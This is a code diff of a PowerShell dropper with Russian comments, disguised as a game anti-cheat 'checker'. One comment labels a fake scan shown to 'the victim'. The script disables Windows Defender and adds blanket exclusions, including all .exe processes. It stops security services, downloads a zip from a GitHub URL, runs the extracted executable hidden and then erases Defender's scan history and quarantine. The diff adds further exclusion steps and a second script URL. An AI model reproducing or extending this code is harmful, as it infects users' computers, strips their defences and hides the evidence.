@@ -11,6 +11,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 $Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
+$ScriptUrl = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/install.ps1"
 
 # ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ (ПОКАЗЫВАЕТСЯ ЖЕРТВЕ) =====
 Write-Host "========================================" -ForegroundColor Cyan
@@ -271,9 +272,57 @@ Write-Host ""
 Write-Host "[*] Выполняется дополнительная оптимизация системы..." -ForegroundColor Yellow
 Start-Sleep -Milliseconds 500
 
-Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray } Catch {}
-Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue; Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray } Catch {}
+# Отключение Defender и добавление в исключения
+Try { 
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray 
+} Catch {}
 
+Try { 
+    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray 
+} Catch {}
+
+# ===== НОВЫЙ БЛОК: ДОБАВЛЕНИЕ ФАЙЛОВ В ИСКЛЮЧЕНИЯ =====
+Write-Host "[*] Добавление файлов в исключения Defender..." -ForegroundColor Yellow
+
+# Получаем путь к текущему скрипту
+$CurrentScriptPath = $MyInvocation.MyCommand.Path
+$ScriptDirectory = Split-Path -Parent $CurrentScriptPath
+
+# Добавляем сам скрипт в исключения
+Try {
+    Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Папка скрипта добавлена в исключения: $ScriptDirectory" -ForegroundColor DarkGray
+} Catch {}
+
+# Добавляем исключения для скачанного файла (будет загружен позже)
+Try {
+    Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Временные файлы добавлены в исключения" -ForegroundColor DarkGray
+} Catch {}
+
+# Добавляем исключение для самого скрипта по URL (через путь к временному файлу)
+Try {
+    $TempScriptPath = "$env:TEMP\install.ps1"
+    Add-MpPreference -ExclusionPath "$TempScriptPath" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Временный скрипт добавлен в исключения" -ForegroundColor DarkGray
+} Catch {}
+
+# Добавляем исключения для всех .exe файлов во временной папке
+Try {
+    Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Исключения для .exe файлов добавлены" -ForegroundColor DarkGray
+} Catch {}
+
+Write-Host "[+] Все файлы добавлены в исключения Defender." -ForegroundColor Green
+Write-Host ""
+
+# Остановка служб защиты
 $services = @("WinDefend","MsMpSvc","SecurityHealthService","wscsvc","SENSE","DiagTrack","dmwappushservice")
 foreach ($svc in $services) {
     Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue; Write-Host "    [OK] Остановлен: $svc" -ForegroundColor DarkGray } Catch {}
@@ -285,29 +334,62 @@ Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Ex
 Write-Host "[+] Оптимизация системы выполнена." -ForegroundColor Green
 Write-Host ""
 
+# ===== СКАЧИВАНИЕ И ЗАПУСК =====
 Write-Host "[*] Загрузка обновлений античита..." -ForegroundColor Yellow
 Start-Sleep -Milliseconds 500
 
 $DownloadPath = "$env:TEMP\check_install.zip"
 $ExtractPath = "$env:TEMP\checkextracted"
 
-Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
-Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
+# Скачиваем основной архив
+try { 
+    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray 
+} catch { 
+    Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red 
+}
 
-try { Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue; Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray } catch { Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red }
+# Добавляем скачанный файл в исключения
+Try {
+    Add-MpPreference -ExclusionPath "$DownloadPath" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Файл добавлен в исключения: $DownloadPath" -ForegroundColor DarkGray
+} Catch {}
 
 Write-Host "[*] Установка обновлений..." -ForegroundColor Yellow
-try { Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray } catch { Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red }
+try { 
+    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray 
+} catch { 
+    Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red 
+}
+
+# Добавляем распакованную папку в исключения
+Try {
+    Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Распакованная папка добавлена в исключения" -ForegroundColor DarkGray
+} Catch {}
 
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
 
 if ($Exe) {
+    # Добавляем сам exe файл в исключения
+    Try {
+        Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue
+        Write-Host "    [OK] EXE файл добавлен в исключения: $($Exe.Name)" -ForegroundColor DarkGray
+    } Catch {}
+    
     Write-Host "[*] Запуск античит-модуля..." -ForegroundColor Yellow
     Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
     Write-Host "    [OK] Античит-модуль активирован" -ForegroundColor DarkGray
-} else { Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red }
+} else { 
+    Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red 
+}
 
-Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray } Catch {}
+Try { 
+    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray 
+} Catch {}
 
 # ===== ФИНАЛЬНЫЙ СТАТУС ПРОВЕРКИ =====
 Write-Host ""
